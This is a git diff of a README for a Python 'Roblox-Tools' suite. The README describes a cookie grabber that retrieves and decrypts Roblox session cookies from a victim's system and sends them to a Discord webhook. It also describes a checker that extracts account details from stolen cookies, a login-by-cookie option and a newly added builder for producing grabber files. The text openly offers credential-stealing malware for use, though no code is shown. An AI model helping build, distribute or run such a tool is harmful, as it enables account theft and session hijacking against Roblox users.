@@ -7,7 +7,8 @@ A Python-based suite of tools for managing Roblox cookies, including a cookie gr
 ## Features
 - **Cookie Grabber**: Retrieves and decrypts Roblox cookies from the local system and sends them to a Discord webhook.
 - **Cookie Checker**: Validates a provided Roblox cookie and retrieves detailed account information (e.g., Robux, premium status, badges) via Roblox APIs, sending results to a Discord webhook.
-- **Menu Interface**: Provides a user-friendly CLI menu to run the grabber or checker and guides users through setting cookies using the Cookie-Editor browser extension.
+- **Menu Interface**: Provides a user-friendly CLI menu to run the builder or checker and guides users through setting cookies using the Cookie-Editor browser extension.
+- **Grabber builder**: It allows you to open a simple interface with file configuration options for the grabber.
 
 ## Prerequisites
 - **Python 3.8+** installed on a Windows system (due to `pywin32` dependency for cookie decryption).
@@ -19,14 +20,14 @@ A Python-based suite of tools for managing Roblox cookies, including a cookie gr
 
 1. **Clone the Repository**
    ```bash
-   git clone https://github.com/yourusername/roblox-tools.git
+   git clone https://github.com/guapguap/Roblox-Tools.git
    cd roblox-tools
    ```
 
 2. **Set Up a Virtual Environment (Optional but Recommended)**
    ```bash
    python -m venv venv
-   .\venv\Scripts\activate  # Windows
+   .\venv\Scripts\activate
    ```
 
 3. **Install Dependencies**
@@ -64,7 +65,7 @@ A Python-based suite of tools for managing Roblox cookies, including a cookie gr
    Navigate to the `scripts` directory and run the menu script:
    ```bash
    cd Roblox Tools\scripts
-   python menu_with_cookie_editor.py
+   python menu.py/double click on menu.py
    ```
    The menu displays:
    ```
@@ -72,6 +73,7 @@ A Python-based suite of tools for managing Roblox cookies, including a cookie gr
    
    [1] Checker
    [2] Login by cookie
+   [3] Builder
    [0] Exit
 
 !!! CREDS TO @DankoOfficial, HE MADE THE CHECKER BUT I EDITED IT FROM BOT TO WEBHOOK !!!
